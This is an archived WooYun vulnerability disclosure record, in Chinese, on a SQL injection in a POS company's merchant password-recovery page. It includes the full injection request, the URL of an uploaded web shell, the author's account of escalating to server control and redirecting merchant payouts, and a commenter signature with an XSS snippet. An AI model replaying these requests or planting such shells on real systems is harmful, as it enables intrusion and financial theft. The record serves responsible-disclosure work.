{"id": 66011, "wybug_id": "wooyun-2015-0137580", "wybug_title": "山东某POS行业巨头商户系统SQL注入（泄露大量商户信息/服务器掌握/伪造任意金额体现）", "wybug_corp": "山东麦枫网络科技有限公司", "wybug_author": "king7", "wybug_date": "2015-08-30 12:48", "wybug_open_date": "2015-10-17 10:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-17：\t细节向公众公开  简要描述： 我其实是个卖pos鸡的..... 详细说明：  从前台商户找回密码处发现注入，获得一个普通权限登录，发现任意上传。提权拿到服务器大部分日照和淄博还有青岛的户，这个竟然可以体现，也是厉害，那我们去列一下有钱的户，改成我们的账户，爆炸啊~~~危害还可以参考下这个 WooYun: 国内POS机行业巨头某系统漏洞（涉及多家银行/上万家商户资料与代理信息等） 虽然没我上游厉害，，，   漏洞证明：  \nPOST /PGWeb/findPassword.aspx HTTP/1.1Host: mer.strpay.comContent-Length: 1279Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://mer.strpay.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: http://mer.strpay.com/PGWeb/findPassword.aspxAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=yc2tnv3p3tqzewtpconxnkkr__VIEWSTATE=%2FwEPDwUKMTEwNzEwMTA3OA9kFgYCAQ9kFgICAQ9kFgJmDxYCHgRUZXh0BR7puqbmnqvnvZHnu5zph5Hono3mlK%2Fku5jkuK3lv4NkAgMPZBYCAgMPEGQPFgkCAQICAgMCBAIFAgYCBwIIAgkWCRAFJ%2BaIkeWwseivu%2BeahOesrOS4gOaJgOWtpuagoeeahOWQjeensO%2B8nwUBMWcQBSfmiJHmnIDllpzmrKLnmoTkvJHpl7Lov5DliqjmmK%2Fku4DkuYjvvJ8FATJnEAUh5oiR5pyA5Zac5qyi55qE6L%2BQ5Yqo5ZGY5piv6LCB77yfBQEzZxAFIeaIkeacgOWWnOasoueahOeJqeWTgeeahOWQjeensO%2B8nwUBNGcQBRjmiJHmnIDllpzmrKLnmoTmrYzmm7LvvJ8FATVnEAUY5oiR5pyA5Zac5qyi55qE6aOf54mp77yfBQE2ZxAFG%2BaIkeacgOeIseeahOS6uueahOWQjeWtl%2B%2B8nwUBN2cQBRXmiJHmnIDniLHnmoTnlLXlvbHvvJ8FAThnEAUV5oiR5aaI5aaI55qE55Sf5pel77yfBQE5Z2RkAgUPFgIfAAWyATxwPkNvcHlyaWdodDIwMDMtMjAxMizniYjmnYPmiYDmnInvvJrpuqbmnqvnvZHnu5znp5HmioDmnInpmZDlhazlj7jvvIzlu7rorr7ov5DokKXvvJrpuqbmnqvnvZHnu5znp5HmioDmnInpmZDlhazlj7gmbmJzcDs8YnIgLz7nvZHnq5nlpIfmoYjlj7fvvJog6bKBSUNQ5aSHMTIwMDE4ODDlj7ctMTxiciAvPjwvcD5kGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxJbWFnZUJ1dHRvbjHfV021awTJOXGeiSCjLRZskDbPIhVfFbrEIhN%2Bzj6n%2Fg%3D%3D&__EVENTVALIDATION=%2FwEWDgL36vmJCQKyzcaDDQLq3reWAgL13reWAgL03reWAgL33reWAgL23reWAgLx3reWAgLw3reWAgLz3reWAgLi3reWAgLt3reWAgK9jZETAtLCmdMIsDUsX2EPyoIm55qiw%2B4r%2F2AQI6zrDK5484W%2BSwRZIps%3D&email=aaaaa%40qq.com&tokenSn=&pwdQuestion=2&question=&answer=aa%27&ImageButton1.x=128&ImageButton1.y=18\nPOST数据包\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttp://mer.strpay.com/upload/2015082810401323-1a347a9c87f54660a7e67150cf5d6f57.aspx\ncmd aspx   修复方案：     版权声明：转载请注明来源 king7@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-09-02 10:40 厂商回复： CNVD确认并复现所述情况，已由CNVD通过网站管理方公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-28 12:48 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  pos鸡……    \n     2015-08-28 12:49 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:571 漏洞数:107        | 长期1:7回收WB,手续费协商,个位数到三位数...)\t\t \n  为什么这么快？wooyun 需要吗，多少费率都能办的    \n     2015-08-28 14:30 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @疯狗 狗哥 拜托了 http://www.wooyun.org/bugs/wooyun-2015-0137536/trace/d6c77ed8252f2859ad0c76d31ab0ac96【握拳】    \n     2015-08-28 14:38 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:261 漏洞数:36        | 杀猪刀啊，杀猪刀啊)\t\t \n  错别字逼死强迫症！！！    \n     2015-08-28 19:14 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @浩天 http://www.wooyun.org/bugs/wooyun-2015-0137536/trace/d6c77ed8252f2859ad0c76d31ab0ac96 拜托了 【握拳】    \n     2015-09-10 22:53 |    \t\t山东麦枫网络科技有限公司(乌云厂商)\t\t \n  你好，此系统是用于测试。包括服务器都是放在公网做演示，无其他权限。但是官网等WEB 在上面，有可能导致修改联系方式等。造成危害。很感谢您，非常谢谢。测试系统说明：查询最近交易记录，时间是2015年2月8日。2015020814482923St7E\t15038236\t消费\t1014.00\t5.10\t1008.90\t未结算\t2015/02/08 14:45:47里面的数据都是手工编写的，没有用真实客户信息。非常感谢您，请你和我取得联系，小小心意。    \n     2015-09-11 16:04 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:571 漏洞数:107        | 长期1:7回收WB,手续费协商,个位数到三位数...)\t\t \n  @山东麦枫网络科技有限公司 看到有礼物我就赶紧来了，请私信我啊~~    \n     2015-09-11 20:26 |    \t\t山东麦枫网络科技有限公司(乌云厂商)\t\t \n  @king7 你好，能证明下你就是作者吗？你可以修改下漏洞证明里面的说明文字， 我能看到。因为我这边分不清到底哪一位才是漏洞作者。    \n     2015-09-11 20:28 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:571 漏洞数:107        | 长期1:7回收WB,手续费协商,个位数到三位数...)\t\t \n  @山东麦枫网络科技有限公司 只有匿名的就是路人甲。这样。你给我个联系方式。我截图给你看看。我发表的。在我这边可以看到的    \n     2015-09-11 20:32 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:571 漏洞数:107        | 长期1:7回收WB,手续费协商,个位数到三位数...)\t\t \n  @山东麦枫网络科技有限公司 ...我已经取消匿名了。你看一下吧    \n     2015-09-11 20:54 |    \t\t山东麦枫网络科技有限公司(乌云厂商)\t\t \n  @king7 看到了。  有QQ吗？ 转账给你      \n     2015-09-11 20:55 |    \t\t山东麦枫网络科技有限公司(乌云厂商)\t\t \n  @king7 你可以继续匿名了    \n     2015-09-11 20:58 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:571 漏洞数:107        | 长期1:7回收WB,手续费协商,个位数到三位数...)\t\t \n  @山东麦枫网络科技有限公司   麻烦你联系下我QQ把。3778275    \n     2015-09-11 21:00 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:261 漏洞数:36        | 杀猪刀啊，杀猪刀啊)\t\t \n  @king7 表哥 分红吗    \n     2015-09-11 21:02 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:571 漏洞数:107        | 长期1:7回收WB,手续费协商,个位数到三位数...)\t\t \n  @DNS 你从哪跑出来的，吓我一跳    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}